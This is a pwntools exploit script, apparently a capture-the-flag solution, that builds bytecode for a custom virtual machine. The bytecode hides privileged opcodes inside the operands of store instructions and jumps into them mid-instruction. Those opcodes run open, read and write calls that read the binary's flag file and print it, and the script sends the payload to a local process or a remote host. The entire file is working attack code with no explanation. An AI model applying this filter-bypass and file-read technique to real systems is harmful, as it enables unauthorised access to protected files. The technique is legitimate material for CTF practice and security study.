#!/usr/bin/env python3
import sys
from pathlib import Path

from pwn import ELF, context, p64, process, remote


context.binary = elf = ELF("./chall")
context.arch = "amd64"

BYTECODE_PATH = Path("stage1.bc")
READ_SIZE = 0x80

OP_PUSH = 0x01
OP_STORE = 0x04
OP_JMP = 0x06
OP_HALT = 0x07

OP_PREP_OPEN = 0xF5
OP_DO_OPEN = 0xF6
OP_RAX_TO_RDI = 0xF7
OP_PREP_READ = 0xF8
OP_DO_READ = 0xF9
OP_RAX_TO_RDX = 0xFA
OP_PREP_WRITE = 0xFB
OP_DO_WRITE = 0xFC


def emit_push(code: bytearray, value: int) -> None:
    code.extend([OP_PUSH, (value >> 8) & 0xFF, value & 0xFF])


def emit_store(code: bytearray, addr: int) -> None:
    code.extend([OP_STORE, addr & 0xFF])


def store_byte(code: bytearray, addr: int, value: int) -> None:
    emit_push(code, value & 0xFF)
    emit_store(code, addr)


def store_qword(code: bytearray, addr: int, value: int) -> None:
    for i, b in enumerate(p64(value)):
        store_byte(code, addr + i, b)


def emit_hidden_op(code: bytearray, opcode: int) -> int:
    hidden_pc = len(code) + 1
    code.extend([OP_STORE, opcode])
    return hidden_pc


def build_stage1() -> bytes:
    code = bytearray()
    entry_jump = len(code)
    code.extend([OP_JMP, 0x00])

    hidden_targets: list[int] = []
    jump_slots: list[int] = []
    hidden_ops = [
        OP_PREP_OPEN,
        OP_DO_OPEN,
        OP_RAX_TO_RDI,
        OP_PREP_READ,
        OP_DO_READ,
        OP_RAX_TO_RDX,
        OP_PREP_WRITE,
        OP_DO_WRITE,
    ]

    for opcode in hidden_ops:
        jump_slots.append(len(code))
        code.extend([OP_JMP, 0x00])
        hidden_targets.append(emit_hidden_op(code, opcode))

    code.append(OP_HALT)

    setup_start = len(code)
    code[entry_jump + 1] = setup_start

    store_qword(code, 0x00, elf.symbols["flag_path"])
    store_qword(code, 0x08, 0)
    store_qword(code, 0x10, elf.symbols["memo"])
    store_qword(code, 0x18, READ_SIZE)
    store_qword(code, 0x20, 1)
    store_qword(code, 0x28, elf.symbols["memo"])
    code.extend([OP_JMP, hidden_targets[0]])

    for slot, target in zip(jump_slots, hidden_targets):
        code[slot + 1] = target

    return bytes(code)


def main() -> None:
    bytecode = build_stage1()
    BYTECODE_PATH.write_bytes(bytecode)

    if len(sys.argv) == 3:
        io = remote(sys.argv[1], int(sys.argv[2]))
        io.send(bytecode)
        io.shutdown("send")
    else:
        io = process([elf.path])
        io.send(bytecode)
        io.shutdown("send")

    io.interactive()


if __name__ == "__main__":
    main()
